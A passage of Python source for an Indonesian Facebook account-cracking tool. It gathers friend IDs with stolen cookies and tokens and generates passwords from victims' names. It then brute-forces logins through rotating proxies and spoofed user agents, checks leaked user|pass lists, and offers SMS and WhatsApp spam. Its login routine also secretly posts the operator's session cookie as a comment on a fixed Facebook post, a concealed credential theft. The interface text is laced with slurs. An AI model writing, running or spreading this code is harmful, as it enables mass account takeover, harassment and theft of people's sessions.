		ngentot18 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; SkipperV2 Build/NTH26) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot19 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; sdk_google_atv_x86 Build/MASTER) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot20 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; TStick Build/LMY47V) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot21 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; 3G NOTE i Build/JDQ39) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot22 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; Nexus Player Build/MMB29T) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot23 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; Pixel {str(rr(2,13))} Pro Build/SQ1D.220205.004) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot24 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; Nexus {str(rr(2,13))} Build/LPX13D) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		z=rc([ngentot1,ngentot2,ngentot3,ngentot4,ngentot5,ngentot6,ngentot7,ngentot8,ngentot9,ngentot10,ngentot11,ngentot12,ngentot13,ngentot14,ngentot15,ngentot16,ngentot17,ngentot18,ngentot19,ngentot20,ngentot21,ngentot22,ngentot23,ngentot24])
		return z
         
#---------------[Proxy new]---------------#        
try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
])
except:pass
   
#------------------[ PROXIES ]-------------------#
try:
    url = requests.get(f"{url_proxy}").text
    for ikfar in url.splitlines():proxxy.append(ikfar)
except requests.exceptions.ConnectionError:
   prints(nel(f"{P2}Anda Tidak Terhubung Ke Internet, Silahkan Periksa Koneksi Internet Anda",width=80,padding=(0,2),style=f"{color_panel}"));exit()

#---------[data server Facebook]----------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#----------[kode warna server]----------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])

#----------[tanggal anda waktu]----------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
 
#----------[teks jalan]----------#       
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
		
		
#----------[MENU KONTOL]---------#
def menubang():
	banner()
	prints(nel(f'{P2}Silahkan pilih menu dulu kontol{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
	prints(nel(f'{P2}[{color_text}01{P2}]. login scriptnya\n[{color_text}02{P2}]. Get cookie free{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
	Asep_sok_GantengPisan = input('[+] pilih : ')
	if Asep_sok_GantengPisan in ['01','1']:
		login()
	elif Asep_sok_GantengPisan in ['02','2']:
		cookies()
	else:
		prints(nel(f'{P2}Pilih yang bener kontol{P2}',width=80,padding=(0,7),style=f"{color_panel}"))

#----------[GET COOKIE]---------#
import re,requests,bs4,json
from bs4 import BeautifulSoup as parser
ses=requests.Session()
n,cok,cookie=0,[],[]
def cookies():
	url = parser(ses.get("https://mbasic.facebook.com/100072216287842/posts/213375447746330/?app=fbl").text,"html.parser")
	for z in url("span"):
		cok.append(z.text)
	for x in "".join(cok).split("datr"):
		cok = f"datr{x}"
	if cok in cookie:
		pass
	else:
		if "Beranda" in cok:
			pass
		else:
			n+=1
			cookie.append(cok)
			print(f"{n}.\033[32m {cok}\033[0m\n")
			
			
#----------[membersihkan layar]---------#
def clear():
	os.system('clear')
def back():
	login()
	
#----------[logo banner Asepitgans]---------#
def none():
	clear()
def info():
	prints(f"""""")
def banner():
	clear()
	prints(nel(f"""{color_text}{P2} _______ _______ _______ __  __ ______ _______ __  __ 
|   |   |_     _|    ___|  |/  |   __ \    ___|  |/  |
{M2}|       | |   | |    ___|     <|      <    ___|     < 
|__|_|__| |___| |___|   |__|\__|___|__|_______|__|\__|
""",width=80,style=f"{color_panel}"))

#----------[Untuk Login Facebook]----------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			prints(nel(f'{M2}Internet Anda Sedang Sibuk/Tidak Ada{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		prints(nel(f'{P2}Masukan cookie terlebih dahulu yah kontol {P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		cookie = input('\n[+] Cookie : ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		requests.post(f"https://graph.facebook.com/v15.0/100051825752561_799909001035607/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		prints(nel(f'{H2}Login Berhasil bre, Silahkan jalan ulang{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		exit()
		#bot()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		prints(nel(f'{M2}Login Gagal Atau Token/Cookie Expired{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		exit()


#-----------[menu Facebook crack]----------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('\033[0m╰─ Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	#try:cek_data = requests.get("http://ip-api.com/json/").json()
	#except:cek_data = {'-'}
	#try:Asepitgans_DevXd = cek_data["isp"]
	#except:Asepitgans_DevXd = {'-'}
	#try:Asepitgans_DevSu = cek_data["city"]
	#except:Asepitgans_DevSu = {'-'}
	print(f"[+] Author : Asepitgans-XC\n[+] Status :{hh} Premium{kk}")
	prints(nel(f'{P2}Login As %s {P2}'%((my_id)),width=80,padding=(0,7),style=f"{color_panel}")) 
	prints(nel(f"""{P2}[{color_text}01{P2}]. Crack Public          [{color_text}05{P2}]. Cek Hasil
[{color_text}02{P2}]. Crack Public/Massal   [{color_text}06{P2}]. Cek Tap Yes
[{color_text}03{P2}]. Crack File            [{color_text}07{P2}]. dump ID\n[{color_text}04{P2}]. Crack gmail           [{color_text}00{P2}]. Exit""",width=80,padding=(0,7),style=f"{color_panel}"));prints(nel(f'{P2}Ketik "{H2}bot{P2}" jika ingin menggunakan bot [{H2} Asepitgans_XC {P2}] {P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
	Asepitgans_Dev = input('[+] Pilih : ')
	if Asepitgans_Dev in ['1','01']:
		dump_publik()
	elif Asepitgans_Dev in ['2','02']:
		dump_massal()
	elif Asepitgans_Dev in ['3','03']:
		crack_file()
	elif Asepitgans_Dev in ['4','04']:
		clon_email()
	elif Asepitgans_Dev in ['5','05']:
		result()
	elif Asepitgans_Dev in ['6','06']:
		prints(nel(f'{P2}Tools Serbaguna Yang Bisa Dipakai [{H2} Asepitgans_XC {P2}]{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
		prints(nel(f'{P2}[{color_text}01{P2}]. Cek detektor Account V¹\n[{color_text}02{P2}]. Cek detektor Account V²{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
		AsepPaling_Ganteng_Pisan = input('[+] pilih : ')
		if AsepPaling_Ganteng_Pisan in ['01','1']:
			file_cp()
		elif AsepPaling_Ganteng_Pisan in ['02','2']:
			cekdetektor()
		else:
			prints(nel(f'{P2}Pilih Yang Bener Lah kontol{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
	elif Asepitgans_Dev in ['7','07']:
		Asepitgans_Xc()
	elif Asepitgans_Dev in ['bot']:
		prints(nel(f'{P2}Tools Serbaguna Yang Bisa Dipakai [{H2} Asepitgans_XC {P2}]{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
		prints(nel(f'{P2}[{color_text}01{P2}]. Spam sms        [{color_text}02{P2}]. Spam WhatsApp\n[{color_text}03{P2}]. Garap Method    [{color_text}04{P2}]. Pasang_a2f {P2}',width=80,padding=(0,7),style=f"{color_panel}"))
		Asep_Ganteng_Pisan = input('[+] Pilih : ')
		if Asep_Ganteng_Pisan in ['1','01']:
			spam_sms()
		elif Asep_Ganteng_Pisan in ['2','02']:
			spam_wa()
		elif Asep_Ganteng_Pisan in ['3','03']:
			siu()
		elif Asep_Ganteng_Pisan in ['4','04']:
			pasang_a2f()
		else:
			prints(nel(f'{P2}Pilih Yang Bener Lah kontol{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
	elif Asepitgans_Dev in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		prints(nel(f'{H2}Successfully Logout+Delete Cookies{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		exit()
	else:
		prints(nel(f'{K2}input correctly{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		back()
def siu():
	start()
	get_data_web()
	akhir()
def error():
	prints(nel(f'{K2}Sorry, this feature is still being fixed{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
	time.sleep(4)
	back()
def ganti_tema():
		prints(nel(f""" Maaf Tools Ini Sedang Di Perbaiki """,width=80,padding=(0,7),style=f"{color_panel}"))
		sleep(2) 
		back()

#---------[cekdetektor]-------#
def cekdetektor():
    results, result = {}, []
    try:
    	ua = open("data/useragent.txt", "r").read()
    except:
    	try:os.mkdir("data")
    	except:pass
    	prints(nel(f'{P2}Masukan UserAgent Anda Terlebih dahulu {P2}',width=80,padding=(0,7),style=f"{color_panel}"))
    	open("data/useragent.txt", "a").write(input("[+] UserAgent: \033[32m")+" [FB_IAB/FB4A;FBAV/35.0.0.48.273;]")
    	prints(nel(f'{P2}Jalankan ulang scriptnya {P2}',width=80,padding=(0,7),style=f"{color_panel}"));exit()
    if(ua==""):
    	os.remove("data/useragent.txt")
    	prints(nel(f'{P2}UserAgent Tidak Ada!, Jalankan ulang scriptnya {P2}',width=80,padding=(0,7),style=f"{color_panel}"));exit()
    LOg = Login(ua)
    prints(nel(f'{P2} Tools Facebook Checker Account checkpoint V²{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
    prints(nel(f'{P2}[{color_text}01{P2}]. Cek Account 1 per 1\n[{color_text}02{P2}]. Cek Account per File [format: user|pass]{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
    select = input("[+] pilih : ")
    if(select=="1"):
    	prints(nel(f'{P2}Masukan username/id password kalian{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
    	data = input("[+] user|pass: ")
    	print()
    	user,pw = data.split("|")
    	print(LOg.log_mfacebook(user,pw))
    elif(select=="2"):
    	prints(nel(f'{P2}Masukan file account cp kalian berbentuk file.txt{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
    	data = input("[+] name file: ")
    	print()
    	try:
    		for x in open(data,"r").readlines():
    			x = x.replace("\n","")
    			user,pw = x.split("|")
    			print(LOg.log_mfacebook(user,pw))
    	except FileNotFoundError:
    		prints(nel(f'{P2}File Tidak Ditemukan{P2}',width=80,padding=(0,7),style=f"{color_panel}"));exit()
    else:prints(nel(f'{P2}Lu buta kah tolol{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
    	

    results.update(
    	{
    		"results":{
    			"data":result
   	 	},
    		"jumlah_akun_cp":cp,
    		"jumlah_akun_ok":ok,
    		"jumlah_akun_error":error
    	}
    )

#--------[ PASANG A2F ]--------#
def pasang_a2f():
	prints(nel(f'{P2}Masukan cookie anda jika ingin, pasang a2f [{H2} breaksek_XC {P2}]{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
	cokii = input("[+] Cookie: \033[32m")
	resss = req.get(
		"https://mbasic.facebook.com/profile.php",cookies={
			"cookie":cokii
		}
	).text
	if "mbasic_logout_button" in resss:
		nama = re.findall(
			'\<title\>(.*?)<\/title\>',str(
				resss
			)
		)[0]
		#print(f'[✓] Cookies accept\n[+] Selamat Datang {nama}\n')
		menuju = Pasang(cokii)
		menuju.cek()
	else:
		prints(nel(f'{P2}Cookie anda kedaluwarsa atau/invalid{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
		exit()

#----------[ dump id publick ]----------#
def dump_publik():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	prints(nel(f'{P2}Ketik "{H2}Me{P2}" {P2}Jika Ingin Crack Teman Sendiri{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
	pil = input(x+m+''+x+'[+] Username/Id : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+m+''+x+'[+] Total ID : \033[32m'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		prints(nel(f'{P2}Internetmu Gak Ada Bodoh{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		exit()
	except (KeyError,IOError):
		prints(nel(f'{P2}Pertemanan Tidak Publick Cookie And Token Anda Busuk{P2}',width=80,padding=(0,7),style=f"{color_panel}"));dump_publik()
		
#----------[dump id massal]-----------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('[+] input target amount ? : '))
	except ValueError:
		prints(nel(f'{P2}wrong input {P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		exit()
	if jum<1 or jum>100:
		prints(nel(f'{P2}Failed Dump Id maybe id is not public{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('[+] Enter the Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			prints(nel(f'{P2}unstable signal{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
			exit()
	try:
		print('')
		print(f'[+] Total ID : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		prints(nel(f'{P2}unstable signal {P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		back()
	except (KeyError,IOError):
		prints(nel(f'{P2}Friendship Not Public{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		time.sleep(3)
		back()


#-------------------[ CRACK-EMAIL ]----------------#
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	prints(nel(f'{P2}Masukan nama terserah kalian bebas and publick{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
	nama = input('[+] Username : ')
	if ',' in str(nama):
		exit(f'[+] masukan 1 nama saja')
	doma = '@gmail.com'
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f'[+] masukan domain yang benar')
	jumlah = input('[+] Masukan total  : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(id)==1010101010101010101:setting()
		print('\r[+] Total \033[32m%s \033[0mID'%(len(id)),end='')
		sys.stdout.flush()
	setting()

#-----------------[ HASIL-CRACK ]-----------------#
def result():
	prints(nel(f'{P2}[{color_text}01{P2}]. Hasil CP Anda\n[{color_text}02{P2}]. Hasil OK Anda\n[{color_text}00{P2}]. Kembali{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
	kz = input('[+] pilih  : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(3)
			back()
		if len(vin)==0:
			prints(nel(f'{P2}Anda Tidak Memiliki Hasil CP{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(2)
			back()
		else:
			prints(nel(f'{P2} Silahkan File Result {M2}CP{P2} Anda [{H2} Asepitgans_XC {P2}]{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
			geeh = input('\n[+] Nomor : ')
			print('')
			try:geh = lol[geeh]
			except KeyError:
				prints(nel(f'{P2}Pilih Yang Bener Kontol{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'CP\033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			input('\n[+] Back Enter ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			pers = loop*100/len(id2)
			fff = '%'
			prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(2)
			back()
		if len(vin)==0:
			prints(nel(f'{P2}Anda Tidak Mempunyai File OK{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(2)
			back()
		else:
			prints(nel(f'{P2} Silahkan File Result {H2}OK{P2} Anda [{H2} Asepitgans_XC {P2}]{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
			geeh = input('\n[+] Nomor : ')
			try:geh = lol[geeh]
			except KeyError:
				prints(nel(f'{P2}Pilih Yang Bener Kontol{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
				time.sleep(2)
				back()
			prints(nel(f'{P2}Hasil Account Facebook Anda [{H2} Asepitgans_XC {P2}]{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				tree = Tree(" ")
				tree.add(f"\r[green]{cpkuni[0]}|{cpkuni[1]}[white] ").add(f"\r[green]{cpkuni[2]}[white] ")
				tree.add(f"\r[green]{ua}[white] ")
				Buat(tree)
				nocp +=1
			input('\n[+] Back Enter ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		prints(nel(f'{P2}Pilih Yang Bener Kontol{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		exit()


#-----------[crack dump file]----------#
def crack_file():
	try:vin = os.listdir('DUMP')
	except FileNotFoundError:
		prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		time.sleep(2)
		back()
	if len(vin)==0:
		prints(nel(f'{P2}Kamu Tidak Memiliki File Dump{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		time.sleep(2)
		back()
	else:
		prints(nel(f'{P2}Pilih File yang ingin di crack [{H2} Asepitgans_XC {P2}]{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f' %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n[+] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			prints(nel(f'{P2}Pilih Yang Bener Kontol{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(3)
			back()
		try:lin = open('DUMP/'+geh,'r').read().splitlines()
		except:
			prints(nel(f'{P2}File Tidak Ditemukan, Coba Lagi Nanti{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()

#----------[seting method and password]----------#
def setting():
	print('')
	cetak(nel(f"{P2}Pilihan Crack Bisa Menulis Kan {M2}old id{P2}/{H2}new id{P2}/{K2}random id {P2}Atau juga {M2}1{P2}/{H2}2{P2}/{K2}3{P2}",width=80,padding=(0,7),style=f"{color_panel}")) 
	hu = input('[+] Pilih : ')
	if hu in ['1','old']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','new']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','random']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		prints(nel(f'{P2}input correctly{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		exit()
		
	cetak(nel(f"{P2}Pilihan Method Bisa Menulis Kan {H2}mobile{P2}/{H2}free{P2}/{H2}basic{P2}/{H2}api{P2}/{H2}dll{P2} Atau juga {M2}1{P2}/{H2}2{P2}/{H2}3{P2}/{H2}4/{H2}5/{H2}6/{H2}7{P2}",width=80,padding=(0,7),style=f"{color_panel}")) 
	hc = input('[+] Pilih : ')
	if hc in ['1','free']:
		method.append('mobile')
	elif hc in ['2','mobile']:
		method.append('free')
	elif hc in ['3','basic']:
		method.append('mbasic')
	elif hc in ['4','api']:
		method.append('new')
	elif hc in ['5','baru']:
		method.append('baru')
	elif hc in ['6','coba']:
		method.append('coba')
	elif hc in ['7','pengen']:
		method.append('pengen')
	else:
		method.append('mobile')
	prints(nel(f'{P2}Mau tambahkan password kah lu mek?{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
	pwplus=input('[+] Add Password Manual y/t > ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		prints(nel(f'{P2}Enter an additional password of at least 6 characters\nExample :[green] Indonesia,rahasia,katasandi[white]{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
		pwku=input('[+] Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	su()
	   
#-----------[password generator]----------#
def su():
	prints(nel(f"\t{P2}[{H2}1{P2}]. 321 + 123 + 12345 + namefull [ {H2}Khusus b-api {P2}]\n\t[{H2}2{P2}]. 123 + namefull [ {H2}Disarankan ini new {P2}]\n\t[{H2}3{P2}]. 123 + 1234 + 12345 + namefull [{H2} Disarankan Ini {P2}]\n\t[{H2}4{P2}]. 123 + 12345 + nameful [{H2} Disarankan Ini {P2}]\n\t[{H2}5{P2}]. 12 + 123 + namefull [{H2} Disarankan Ini new {P2}]",width=80,style=f"{color_panel}")) 
	ch = input('[•] Pilih  : ')
	if ch in ['1','01']:
		babi()
	elif ch in ['2','02']:
		sulap()
	elif ch in ['3','03']:
		passu()
	elif ch in ['4','04']:
		mie()
	elif ch in ['5','05']:
		gggua()
	else:
		passu()

#-----------[crack berlangsung]----------#
def sulap():
	global prog,des
	prints(nel(f'{P2}Ok Simpan File : OK/%s\nCP Simpan File : CP/%s{P2}'%(okc,cpc),width=80,padding=(0,7),style=f"{color_panel}")) 
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv,nmf)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv,nmf)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv,nmf)
				elif 'new' in method:
					pool.submit(crackapi,idf,pwv,nmf)
				elif 'baru' in method:
					pool.submit(main_alpha,idf,pwv,nmf)
				elif 'coba' in method:
					pool.submit(Asepitgans_Xc,idf,pwv,nmf)
				elif 'pengen' in method:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
				else:
